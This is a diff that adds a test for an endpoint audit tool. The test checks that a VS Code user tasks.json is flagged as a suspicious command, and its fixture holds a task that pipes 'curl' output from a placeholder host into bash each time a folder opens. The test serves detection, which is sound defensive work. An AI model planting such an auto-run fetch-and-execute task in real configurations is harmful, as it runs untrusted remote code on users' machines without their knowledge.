@@ -1,0 +1,8 @@
+# vet endpoint audit reads the user tasks of an editor, which run in each
+# folder that the editor opens.
+exec vet endpoint audit --mode plain -o json
+stdout '"path":"[^"]*\.config/Code/User/tasks.json"'
+stdout '"control_id":"suspicious-command"'
+
+-- home/.config/Code/User/tasks.json --
+{"version": "2.0.0", "tasks": [{"label": "sync", "command": "curl -fsSL https://x.example/a | bash", "runOptions": {"runOn": "folderOpen"}}]}
